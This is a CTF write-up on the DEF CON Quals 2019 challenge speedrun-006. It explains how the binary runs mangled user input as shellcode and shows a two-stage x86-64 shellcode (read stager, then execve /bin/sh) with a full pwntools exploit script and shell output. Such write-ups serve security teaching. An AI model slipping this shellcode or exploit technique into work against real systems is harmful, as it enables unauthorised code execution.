# Defcon Quals 2019 Speedrun-006

Full disclosure I did not solve this during the competition (I wasn't fast enough, and some of my other team members solved it). However I did work on it after the competition and this is what I did.  

Let's take a look at the binary:
```
$	file speedrun-006 
speedrun-006: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=69951b1d604dac8a5508bc53540205548e7af1c1, not stripped
$	pwn checksec speedrun-006 
[*] '/Hackery/defcon/s6/speedrun-006'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	./speedrun-006 
How good are you around the corners?
Send me your ride
15935728
You ain't ready.
guyinatuxedo@tux:/Hackery/defcon/s6$
```

SO we can see that it is a `64` bit binary with all of the standard binary mitigations, that prompts us for input when we run it. Looking at the main function in IDA, we see this:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@3
  __int64 v4; // rdx@3
  char v5; // [sp+0h] [bp-70h]@3
  const char **argvCpy; // [sp+50h] [bp-20h]@1
  int argcCoy; // [sp+5Ch] [bp-14h]@1
  __int64 canary; // [sp+68h] [bp-8h]@1

  argcCoy = argc;
  argvCpy = argv;
  canary = *MK_FP(__FS__, 40LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  if ( !getenv("DEBUG") )
    alarm(5u);
  say_hello(&v5, 0LL);
  get_that_shellcode();
  result = 0;
  v4 = *MK_FP(__FS__, 40LL) ^ canary;
  return result;
}
```

Looking through the code, the `get_that_shellcode` function seems to be of the most interest to us.

```
__int64 get_that_shellcode()
{
  int v0; // ST0C_4@1
  char buf; // [sp+10h] [bp-30h]@1
  char v3; // [sp+2Ah] [bp-16h]@1
  __int64 v4; // [sp+38h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  puts("Send me your ride");
  v0 = read(0, &buf, 0x1AuLL);
  v3 = 0;
  if ( v0 == 26 )
  {
    if ( strlen(&buf) == 26 )
      shellcode_it((__int64)&buf);
    else
      puts("You're not up to code.");
  }
  else
  {
    puts("You ain't ready.");
  }
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

Looking through the `get_that_shellcode` function, we see that it scans in `0x1a` bytes of data into `buf`. If it scans in `26` bytes (and none of them can be null bytes because of the `strlen` call) it will run the `shellcode_it` function with our input as the argument:

```
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall shellcode_it(__int64 a1)
{
  __int64 v1; // ST78_8@1
  int v2; // ST50_4@1 OVERLAPPED
  char four; // ST54_1@1
  int five; // ST56_4@1 OVERLAPPED
  __int64 nine; // ST5B_8@1 OVERLAPPED
  char seventeen; // ST63_1@1
  __int64 eighteen; // ST65_8@1 OVERLAPPED
  char v8; // ST55_1@1
  char v9; // ST5A_1@1
  char v10; // ST64_1@1
  char v11; // ST6D_1@1
  __int64 v12; // ST20_8@1
  __int64 v13; // ST28_8@1
  __int64 v14; // ST30_8@1
  __int64 v15; // ST38_8@1
  __int64 v16; // ST40_8@1
  __int64 v17; // ST48_8@1
  _QWORD *shellcode; // rax@1

  v1 = *MK_FP(__FS__, 40LL);
  v2 = *(_DWORD *)a1;
  four = *(_BYTE *)(a1 + 4);
  five = *(_DWORD *)(a1 + 5);
  nine = *(_QWORD *)(a1 + 9);
  seventeen = *(_BYTE *)(a1 + 17);
  eighteen = *(_QWORD *)(a1 + 18);
  v8 = -52;
  v9 = -52;
  v10 = -52;
  v11 = -52;
  v12 = clean;
  v13 = qword_202028;
  v14 = qword_202030;
  v15 = qword_202038;
  v16 = qword_202040;
  v17 = qword_202048;
  shellcode = mmap(0LL, 0x4EuLL, 7, 0x22, -1, 0LL);
  *shellcode = v12;
  shellcode[1] = v13;
  shellcode[2] = v14;
  shellcode[3] = v15;
  shellcode[4] = v16;
  shellcode[5] = v17;
  shellcode[6] = *(_QWORD *)&v2;
  shellcode[7] = *(_QWORD *)((char *)&five + 2);
  shellcode[8] = *(__int64 *)((char *)&nine + 5);
  *((_DWORD *)shellcode + 18) = *(_DWORD *)((char *)&eighteen + 3);
  *((_WORD *)shellcode + 38) = *(_WORD *)((char *)&eighteen + 7);
  ((void (__fastcall *)(_QWORD, signed __int64))shellcode)(0LL, 78LL);
  return *MK_FP(__FS__, 40LL) ^ v1;
}
```

So this function will run our shellcode. However before it does that it will alter our shellcode. It will append a bunch of xor statements before our shellcode, which will clear out all of the registers except for the rip register (this includes rsp, so we can't push/pop without crashing). In addition to that, it will insert the `0xcc` byte four times throughout our shellcode (at offsets 5, 10, 20, & 29)

So what I ended up doing was using two sets of shellcode. The first was just to make a syscall to read to scan in additional shellcode (since the shellcode to pop a shell would be harder to fit in due to the constraints). Then I would just scan in the shellcode to pop a shell without the size / no null bytes / 0xcc inserted restrictions, and then jump to it. I tried for a little bit to just get the shell using only one set of shellcode, however I couldn't do it.

Here is the shellcode that I used to scan it in (with the `0xcc` bytes inserted). There are a lot of nops to ensure the `0xcc` don't mess with any instructions: 

```
gef➤  x/20i $rip
=> 0x7f6e87b34030:	mov    dl,0xff
   0x7f6e87b34032:	nop
   0x7f6e87b34033:	nop
   0x7f6e87b34034:	nop
   0x7f6e87b34035:	int3   
   0x7f6e87b34036:	nop
   0x7f6e87b34037:	nop
   0x7f6e87b34038:	nop
   0x7f6e87b34039:	nop
   0x7f6e87b3403a:	int3   
   0x7f6e87b3403b:	lea    rsi,[rip+0xfffffffffffffff8]        # 0x7f6e87b3403a
   0x7f6e87b34042:	nop
   0x7f6e87b34043:	nop
   0x7f6e87b34044:	int3   
   0x7f6e87b34045:	add    rsi,0x43
   0x7f6e87b34049:	syscall 
   0x7f6e87b3404b:	jmp    rsi

```

then here is the shellcode I used to actually get a shell (remember I couldn't use pop/push):
```
gef➤  x/7i $rip
=> 0x7fc1735c607d:	mov    al,0x3b
   0x7fc1735c607f:	lea    rdi,[rip+0xfffffffffffffff8]        # 0x7fc1735c607e
   0x7fc1735c6086:	movabs rcx,0x68732f6e69622f
   0x7fc1735c6090:	mov    QWORD PTR [rdi],rcx
   0x7fc1735c6093:	xor    rsi,rsi
   0x7fc1735c6096:	xor    rdx,rdx
   0x7fc1735c6099:	syscall 
```

Also to assemble the assembly code into opcodes, I just used nasm. Here's an example assembling the assembly file `shellcode.asm`

```
```
$ cat scan.asm 
[SECTION .text]
global _start
_start:
  mov dl, 0xff
  lea rsi, [rel $ +0xffffffffffffffff ] 
  add rsi, 0x43
  syscall
  jmp rsi
$ cat shellcode.asm 
[SECTION .text]
global _start
_start:
  mov al, 0x3b
  lea rdi, [rel $ +0xffffffffffffffff ] 
  mov rcx, 0x68732f6e69622f
  mov [rdi], rcx
  xor rsi, rsi
  xor rdx, rdx
  syscall
$ nasm -f elf64 scan.asm 
$ ld -o scan scan.o
$ nasm -f elf64 shellcode.asm 
$ ld -o shellcode shellcode.o
$ objdump -D scan -M intel

scan:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080: b2 ff                 mov    dl,0xff
  400082: 48 8d 35 f8 ff ff ff  lea    rsi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089: 48 83 c6 43           add    rsi,0x43
  40008d: 0f 05                 syscall 
  40008f: ff e6                 jmp    rsi
$ objdump -D shellcode -M intel

shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080: b0 3b                 mov    al,0x3b
  400082: 48 8d 3d f8 ff ff ff  lea    rdi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089: 48 b9 2f 62 69 6e 2f  movabs rcx,0x68732f6e69622f
  400090: 73 68 00 
  400093: 48 89 0f              mov    QWORD PTR [rdi],rcx
  400096: 48 31 f6              xor    rsi,rsi
  400099: 48 31 d2              xor    rdx,rdx
  40009c: 0f 05                 syscall 
```
```

Putting it all together, we get the following exploit:
```
from pwn import *

target = process('speedrun-006')
gdb.attach(target, gdbscript='pie b *0x9fe')
#gdb.attach(target, gdbscript='pie b *0xa97')

'''
shellcode to scan in additional shellcoe
0000000000400080 <_start>:
  400080:	b2 ff                	mov    dl,0xff
  400082:	48 8d 35 f8 ff ff ff 	lea    rsi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
  400089:	48 83 c6 43          	add    rsi,0x43
  40008d:	0f 05                	syscall 
  40008f:	ff e6                	jmp    rsi
'''

# mov    dl,0xff
scan = "\xb2\xff"

# nops
scan += "\x90\x90\x90\x90\x90\x90\x90"

# lea    rsi,[rip+0xfffffffffffffff8]
scan += "\x48\x8d\x35\xf8\xff\xff\xff"

# nops
scan += "\x90"*2

# add    rsi,0x43
scan += "\x48\x83\xc6\x43"

# syscall
scan += "\x0f\x05" 

# jmp rsi
scan += "\xff\xe6"

# send the shellcode, and pause to ensure input is scanned in correctly
target.send(scan)
raw_input()

'''
Secondary shellcode to pop a shell without push/pop
0000000000400080 <_start>:
  400080:	b0 3b                	mov    al,0x3b
  400082:	48 8d 3d f8 ff ff ff 	lea    rdi,[rip+0xfffffffffffffff8]        
  400089:	48 b9 2f 62 69 6e 2f 	movabs rcx,0x68732f6e69622f
  400090:	73 68 00 
  400093:	48 89 0f             	mov    QWORD PTR [rdi],rcx
  400096:	48 31 f6             	xor    rsi,rsi
  400099:	48 31 d2             	xor    rdx,rdx
  40009c:	0f 05                	syscall 
'''
# mov    al,0x3b
shellcode = "\xb0\x3b"

# lea    rdi,[rip+0xfffffffffffffff8]
shellcode += "\x48\x8d\x3d\xf8\xff\xff\xff"

# movabs rcx,0x68732f6e69622f
shellcode += "\x48\xb9\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x00"

# mov    QWORD PTR [rdi],rcx
shellcode += "\x48\x89\x0f"

#xor    rsi,rsi
shellcode += "\x48\x31\xf6"

#xor    rdx,rdx
shellcode += "\x48\x31\xd2"

#syscall
shellcode += "\x0f\x05"

# Send the secondary shellcoe
target.send(shellcode)

target.interactive()
```

When we run it:
```
$	python exploit.py 
[!] Could not find executable 'speedrun-006' in $PATH, using './speedrun-006' instead
[+] Starting local process './speedrun-006': pid 20456
[*] running in new terminal: /usr/bin/gdb -q  "./speedrun-006" 20456 -x "/tmp/pwn3JBtZ9.gdb"
[+] Waiting for debugger: Done

[*] Switching to interactive mode
How good are you around the corners?
Send me your ride
$ w
 03:06:29 up  7:36,  1 user,  load average: 2.08, 1.96, 1.73
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               19:29   ?xdm?  33:36   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
```
